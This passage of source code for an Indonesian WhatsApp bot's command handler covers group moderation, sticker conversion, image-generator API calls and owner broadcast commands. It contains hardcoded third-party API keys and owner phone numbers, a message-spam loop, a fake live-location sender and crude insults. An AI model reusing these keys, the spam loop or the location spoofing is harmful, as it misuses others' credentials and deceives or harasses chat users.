if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
zeroyt7.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'grouptutup' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
zeroyt7.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
linkgc = await zeroyt7.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
zeroyt7.sendMessage(from, yeh, text, { quoted: ftrol })
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
zeroyt7.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
zeroyt7.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
zeroyt7.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case 'kick' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
}
break
case 'tagall':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
members_id = []
teks = (args.length > 1) ? args.join(' ').trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `• @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break

//━━━━━━━━━━━━━━━[ FITUR TAMBAHAN ]━━━━━━━━━━━━━━━━━//
case 'tagall2':
if (!isGroup) return reply(mess.only.group)
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
zeroyt7.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
break
case 'hidetag2':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
var value = body.slice(9)
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
zeroyt7.sendMessage(from, options, text)
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
zeroyt7.groupUpdateSubject(from, `${body.slice(9)}`)
zeroyt7.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
zeroyt7.groupUpdateDescription(from, `${body.slice(9)}`)
zeroyt7.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setpp':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
media = await zeroyt7.downloadAndSaveMediaMessage(mek, './database/media_user')
await zeroyt7.updateProfilePicture(from, media)
reply(mess.wait)
reply(`\`\`\`✓Sukses Mengganti Profil Group\`\`\` *${groupMetadata.subject}*`)
break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var value = body.slice(9)
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
zeroyt7.sendMessage(from, options, text)
break
case 'listadmin':
if (!isGroup) return replyWithFakeLink(mess.only.group)
teks = `Name Gc : ${groupMetadata.subject}\n*List of Admin : ${groupAdmins.length}*\n\n`
for (let admon of groupAdmins) {
teks += `• @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
break
case 'nsfw':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
but = [
{ buttonId: '!nsfwon', buttonText: { displayText: '✅ AKTIFKAN ✅' }, type: 1 },
{ buttonId: '!nsfwoff', buttonText: { displayText: '❌ MATIKAN ❌' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk nsfw group", faketeks, but, mek)
break
case 'nsfwon':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
if (isNsfw) return reply('Sudah Aktif Kak')
nsfww.push(from)
fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
reply('Sukses mengaktifkan fitur nsfw')
break
case 'nsfwoff':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
if (!isNsfw) return reply('Sudah Mati Kak')
var ini = nsfww.indexOf(from)
nsfww.splice(ini, 1)
fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
reply('Sukses menonaktifkan fitur nsfw')
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'revoke':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
json = ['action', 'inviteReset', from]
zeroyt7.query({json, expect200: true})
reply('Sukses Mereset Link Group')
break

//━━━━━━━━━━━━━━━[ FITUR STICKER ]━━━━━━━━━━━━━━━━━//

case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'patrik': 
buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=2ff99ddfb35e897494de4ee6`) 
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'anjay': case 'doge': case 'anjing':
buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/anjing?apikey=2ff99ddfb35e897494de4ee6`) 
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'amongus': 
buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/amongus?apikey=2ff99ddfb35e897494de4ee6`) 
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'ttp':
if (args.length == 0) return reply(`Example: ${prefix + command} Bayu`)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=2ff99ddfb35e897494de4ee6&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'ttp2':
if (args.length == 0) return reply(`Example: ${prefix + command} Bayu`)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/ttp2?apikey=2ff99ddfb35e897494de4ee6&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'ttp3':
if (args.length == 0) return reply(`Example: ${prefix + command} Bayu`)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/ttp3?apikey=2ff99ddfb35e897494de4ee6&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'attp2':
if (args.length == 0) return reply(`Example: ${prefix + command} Bayu`)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/attp2?apikey=2ff99ddfb35e897494de4ee6&text=${encodeURI(q)}%F0%9F%91%8B`) 
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'attp3':
if (args.length == 0) return reply(`Example: ${prefix + command} Bayu`)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=2ff99ddfb35e897494de4ee6&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'sticker':
case 'stiker':
case 's':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
costum(buffer, sticker, Verived, `Jangan Lupa ☕ NONTON HENTONGERS ☕`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker. pastikan untuk video yang dikirim tidak lebih dari 9 detik`)
})
.on('end', function () {
console.log('Finish')
costum(fs.readFileSync(ran), sticker, Verived, `~ Nih Dah Jadi Gif Stikernya`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(mess.error.stick)
zeroyt7.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: ftrol })
fs.unlinkSync(ranw)
})
})
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
}
break
case 'toimg':
if (!isQuotedSticker) return reply(' reply stickernya gan')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
buffer = fs.readFileSync(ran)
costum(buffer, image, Verived, `Jangan Lupa ☕ NONTON HENTONGERS ☕`)
fs.unlinkSync(ran)
})
break
case 'tomp3':
zeroyt7.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Reply Video nya Tod')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
bufferlkj = fs.readFileSync(ran)
zeroyt7.sendMessage(from, bufferlkj, audio, { mimetype: 'audio/mp4', quoted: ftrol })
fs.unlinkSync(ran)
})
break
case 'tovideo':
if (!isQuotedSticker) return reply('Reply stikernya')
reply(mess.wait)
anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
anum = await zeroyt7.downloadAndSaveMediaMessage(anumedia, './database/media_user')
ran = getRandom('.webp')
exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
fs.unlinkSync(anum)
buffer = fs.readFileSync(ran)
zeroyt7.sendMessage(from, buffer, video, { quoted: ftrol, caption: 'Done... Jangan Lupa ☕ NONTON HENTONGERS ☕' })
fs.unlinkSync(ran)
})
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM ]━━━━━━━━━━━━━━━━━//

case 'sharelock':
 if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Kota|Nama`)
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
zeroyt7.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: zero}, MessageType.liveLocation, {quoted: ftrol})
break
case 'rulesbot':
ruls =`*Syarat & Ketentuan ${botname}*
Harus di patuhi, Kalau tidak di Banned!

🗿. ➡️ Dilarang Toxic Ke Bot. 🤖
🗿. ➡️ Dilarang VC/Call Bot. 🤖
🗿. ➡️ Dilarang Spam Fitur Bot. 🤖
🗿. ➡️ Dilarang Culik Bot ke Grup. 🤖

Kalo sudah dipahami Rules nya
*Silahkan lanjut gunakan ${botname}!*`
but = [{ buttonId: `${prefix}owner`, buttonText: { displayText: '⚔️ OWNER ⚔️' }, type: 1 }]
sendButton(from, ruls, faketeks, but, mek)
break
case 'owner':
let inilist = []
for (let i of ownerNumber) {
let vname = zeroyt7.contacts[i] != undefined ? zeroyt7.contacts[i].vname || zeroyt7.contacts[i].notify : undefined
inilist.push({
"displayName": 'BAYU',
"vcard": 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:KONTOLODON 🤫\n`
+ `ORG:HENTONGERS 😏 ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
})
}
hehe = await zeroyt7.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: ftrol })
button = [
  {buttonId: '.youtube', buttonText: {displayText: '🍺 YOUTUBE 🍺'}, type: 1},
  {buttonId: '.instagram', buttonText: {displayText: '🥛 INSTAGRAM 🥛'}, type: 1},
  {buttonId: '.tiktok', buttonText: {displayText: '🥤 TIKTOK 🥤'}, type: 1}
]
 buttons = {
    contentText: 'Nih Nomer Owner Ku 😜 ?',
    footerText: faketeks,
    buttons: button,
    headerType: 1
}
await zeroyt7.sendMessage(from, buttons, MessageType.buttonsMessage, {quoted: ftrol})
break
case 'report':
let pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = mek.participant
let teks1 = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
zeroyt7.sendMessage(`6285894327468@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'youtube':
teks =
`Nih Youtube Owner Ku Jangan Lupa Di Subscribe Ya\nbit.ly/hehe`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'instagram':
teks =
`Nih Instagram Owner Ku Jangan Lupa Di Follow Ya\nhttps://instagram.com/Hentongers_`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'tiktok':
teks =
`Nih Tiktok Owner Ku Jangan Lupa Di Follow Ya\nhttps://tiktok.com/@hmzzz`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'sourcecode':
case 'script':
case 'sc':
teks = 
`*Bot Ini Menggunakan Sourcecode*
╭─────────────────────
├ Sc Ori = TEBAK AJAH HEHE 😁
├─────────────────────
├ Creator Base = Wilykun 😏 
├ Creator Sc = HENTONGERS™
└─────────────────────`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol}) 
break
case 'request':
					const rq = body.slice(8)
					if (args.length > 300) return zeroyt7.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					const ress = `*[REQUEST VITUR]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${rq}`
							var options = {
							text: ress,
                         				contextInfo: {mentionedJid: [nomor]},
                     			}
					zeroyt7.sendMessage('6285894327468@s.whatsapp.net', options, text, {quoted: ftrol})
					zeroyt7.sendMessage('6285215692567@s.whatsapp.net', options, text, {quoted: ftrol})
					reply('REQUEST ANDA TELAH SAMPAI KE PENGEMBANG SC, Requests palsu atau main² tidak akan ditanggapi.')
					break
		
		case 'ssweb':  
                   if (args.length == 0) return reply(`Link Nya Mana Tod ?\nContoh : ${prefix + command} *https://google.com*`)                  
                   reply(mess.wait)
                   zerr = args.join(" ")
                   buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${zerokey}&url=${zerr}`)
                   zeroyt7.sendMessage(from, buffer, image, {caption: `done\n\nPlease Support Hentongers 😈`, quoted: ftrol})
                   break
                   
//━━━━━━━━━━━━━━━[ FITUR OWNER ]━━━━━━━━━━━━━━━━━//

case 'bc':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (args.length < 1) return reply('Teksnya?')
anu = await zeroyt7.chats.all()
for (let _ of anu) {
buttonss = [{buttonId: `${prefix}menu`, buttonText: {displayText: '📃 MENU 📃'}, type: 1},{buttonId: `${prefix}sewabot`, buttonText: {displayText: '📋 SEWA BOT 📋'}, type: 1}]
const btnbc = {
contentText: `${q}`,
footerText: '*🔰 SILAHKAN TEKAN BUTTON UNTUK INFORMASI LANJUT 🔰*',
buttons: buttonss,
headerType: 1
}
await zeroyt7.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
}
reply(`Sukses mengirim Broadcast:\n${q}`)
break
case 'spam':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix}spam teks|jumlah`)
argzi = q.split("|")
if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
if (isNaN(argzi[1])) return reply(`Harus berupa angka`)
for (let i = 0; i < argzi[1]; i++){
zeroyt7.sendMessage(from, argzi[0], MessageType.text)
}
break
case 'setppwa':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedImage) return reply(`Reply Imagenya!`)
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(enmedia)
await zeroyt7.updateProfilePicture(botNumber, media)
reply('*Makasih Profile Barunya :)*')
break
case 'setbio':{
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
zeroyt7.setStatus(q)
.then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
reply(mess.success)
}
break
case 'leave':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
setTimeout( () => {
zeroyt7.groupLeave(from) 
}, 2000)
setTimeout( () => {
reply('Bye Tod💔...')
}, 0)
break
case 'block':
zeroyt7.updatePresence(from, Presence.composing) 
zeroyt7.chatRead (from)
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (!isGroup) return reply(mess.only.group)
zeroyt7.blockUser (`${body.slice(7)}@c.us`, "add")
zeroyt7.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
break
case 'unblock':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
				    zeroyt7.blockUser (`${body.slice(9)}@c.us`, "remove")
					zeroyt7.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break


//━━━━━━━━━━━━━━━[ INFO BOT ]━━━━━━━━━━━━━━━━━//

case "speed":
case "ping":
timestamp = speed();
latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr) => {
child = stdout.toString("utf-8");
ssd = child.replace(/Memory:/, "Ram:");
pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
reply(pingnya);
});
break
case "runtime":
case "test":
run = process.uptime();
teks = `${kyun(run)}`;
reply(teks);
sound = fs.readFileSync('./vano/patrik.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4',ptt:true})
break


//━━━━━━━━━━━━━━━[ FITUR MAKER ]━━━━━━━━━━━━━━━━━//

case 'harrypotter':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh: ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/harrypotter?apikey=${zerokey}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*©Creator : Hentongers*'})
break
case 'phkomen':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`)
username = args[0]
comment = args[2]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/phcomment?apikey=${zerokey}&img=https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg&text=${comment}&username=${username}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*©Creator : YT ☕ NONTON HENTONGERS ☕*'})
break
case 'blackpink':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${zerokey}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol})
break
case 'pornhub':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Bayu|Yoaimo`)
txt1 = args[0]
txt2 = args[1]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${zerokey}&text1=${txt1}&text2=${txt2}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol })
break
case 'text1917':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome/text1917?apikey=${zerokey}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol})
break
case 'freefire':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/freefire?apikey=${zerokey}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol})
break
case 'pubg':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
txt1 = args[0]
txt2 = args[1]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/pubg?apikey=${zerokey}&text1=${txt1}&text2=${txt2}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: mek })
break
case 'ytkomen':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
username = args[0]
comment = args[2]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/ytcomment?apikey=${zerokey}&username=${username}&comment=${comment}&img=https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*©Creator : YT ☕ NONTON HENTONGERS ☕*'})
break
case 'nulis':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Ikeh Kimochi`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/nulis?apikey=${zerokey}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'NIH TOD ASU'})
break


//APIKEY DAP KEY!! 
case 'nuliskanan':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Ikeh Kimochi`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.dapuhy.ga/api/maker/nuliskanan?text=${zerr}&apikey=${dapapi}`) 
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'NIH TOD ASU'})
break
case 'nuliskiri':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Ikeh Kimochi`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.dapuhy.ga/api/maker/nuliskiri?text=${zerr}&apikey=${dapapi}`) 
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'NIH TOD ASU'})
break
case 'foliokanan':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Ikeh Kimochi`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.dapuhy.ga/api/maker/foliokanan?text=${zerr}&apikey=${dapapi}`) 
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'NIH TOD ASU'})
break
case 'foliokiri':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Ikeh Kimochi`)
zerr = args.join(" ")
